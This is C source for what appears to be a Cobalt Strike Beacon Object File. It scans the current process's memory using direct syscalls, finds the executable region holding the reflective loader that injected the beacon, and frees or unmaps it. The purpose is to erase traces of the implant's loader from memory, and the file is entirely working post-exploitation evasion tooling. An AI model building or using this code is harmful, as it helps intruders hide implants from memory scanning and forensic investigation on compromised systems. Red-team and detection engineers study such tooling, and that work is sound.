
#include "entry.h"
#include "beacon.h"
#include "syscalls.c"

// helper function to get the instruction pointer
__declspec(naked) PVOID get_ip(VOID)
{
#ifdef _WIN64
    __asm__(
    "mov rax, [rsp] \n"
    "ret \n"
    );
#else
    __asm__(
    "mov eax, [esp] \n"
    "ret \n"
    );
#endif
}

BOOL free_udrl(VOID)
{
    BOOL is_pe = FALSE;
    BOOL success = FALSE;
    BOOL is_mapped = FALSE;
    PVOID base_address, current_address;
    SIZE_T region_size;
    current_address = 0;
    MEMORY_INFORMATION_CLASS mic = 0;
    MEMORY_BASIC_INFORMATION mbi;

    PVOID IP = get_ip();

    while (TRUE)
    {
        NTSTATUS status = NtQueryVirtualMemory(
            NtCurrentProcess(),
            (PVOID)current_address,
            mic,
            &mbi,
            sizeof(mbi),
            NULL);
        if (!NT_SUCCESS(status))
            break;

        base_address = mbi.BaseAddress;
        region_size = mbi.RegionSize;
        // next memory range
        current_address = base_address + region_size;

        // ignore non-commited pages
        if (mbi.State != MEM_COMMIT)
            continue;
        // ignore pages with PAGE_NOACCESS
        if ((mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS)
            continue;
        // ignore pages with PAGE_GUARD as they can't be read
        if ((mbi.Protect & PAGE_GUARD) == PAGE_GUARD)
            continue;
        // ignore pages that are not executable
        if (((mbi.Protect & PAGE_EXECUTE_READ)      != PAGE_EXECUTE_READ) &&
            ((mbi.Protect & PAGE_EXECUTE_READWRITE) != PAGE_EXECUTE_READWRITE) &&
            ((mbi.Protect & PAGE_EXECUTE_READWRITE) != PAGE_EXECUTE_READWRITE) &&
            ((mbi.Protect & PAGE_EXECUTE_WRITECOPY) != PAGE_EXECUTE_WRITECOPY))
            continue;
        // ignore image pages (this might change in the future!)
        if (mbi.Type == MEM_IMAGE)
            continue;
        // make sure it is not beacon
        if ((ULONG_PTR)IP >= (ULONG_PTR)base_address &&
            (ULONG_PTR)IP < RVA(ULONG_PTR, base_address, region_size))
            continue;


        DPRINT(
            "range: 0x%p, DataSize: 0x%llx, State: 0x%lx, Protect: 0x%lx, Type: 0x%lx",
            base_address,
            region_size,
            mbi.State,
            mbi.Protect,
            mbi.Type);

        is_pe = is_valid_pe(base_address, region_size);
        if (is_pe)
        {
            DPRINT("The region seems to be a valid PE");
            is_mapped = mbi.Type == MEM_MAPPED;
            success = free_region(base_address, region_size, is_mapped);
            if (success)
            {
                DPRINT("Removed the UDRL at: 0x%p", base_address);
                return TRUE;
            }

            PRINT_ERR(
                "Could not free range of 0x%llx bytes at 0x%p",
                region_size,
                base_address);
        }
    }
    return FALSE;
}

BOOL is_valid_pe(
    PVOID base_address,
    SIZE_T region_size)
{
    PIMAGE_NT_HEADERS pNtHeaders;

    // make sure the MZ magic bytes are valid
    if (*(PUSHORT)base_address == MZ)
    {
        pNtHeaders = RVA(
            PIMAGE_NT_HEADERS,
            base_address,
            ((PIMAGE_DOS_HEADER)base_address)->e_lfanew);

        // make sure that pNtHeaders is in within the memory range
        if ((ULONG_PTR)pNtHeaders >= (ULONG_PTR)base_address &&
            (ULONG_PTR)pNtHeaders < RVA(ULONG_PTR, base_address, region_size) - 3)
        {
            // check the NT_HEADER signature
            if (pNtHeaders->Signature == IMAGE_NT_SIGNATURE)
            {
                // found valid PE image, hopefully the reflective loader
                return TRUE;
            }
        }
    }
    return FALSE;
}

BOOL free_region(
    PVOID base_address,
    SIZE_T region_size,
    BOOL is_mapped)
{
    NTSTATUS status;
    if (is_mapped)
    {
        status = NtUnmapViewOfSection(
            NtCurrentProcess(),
            base_address);
        DPRINT("NtUnmapViewOfSection status: 0x%lx", status);
    }
    else
    {
        // region_size must be 0 for MEM_RELEASE
        region_size = 0;
        status = NtFreeVirtualMemory(
            NtCurrentProcess(),
            &base_address,
            &region_size,
            MEM_RELEASE);
        DPRINT("NtFreeVirtualMemory status: 0x%lx", status);
    }
    return NT_SUCCESS(status);
}

void go(char* args, int length)
{
    if (free_udrl())
    {
        PRINT("Removed the User Defined Reflective Loader :)");
    }
    else
    {
        PRINT_ERR("Could NOT remove the User Defined Reflective Loader :(");
    }
}
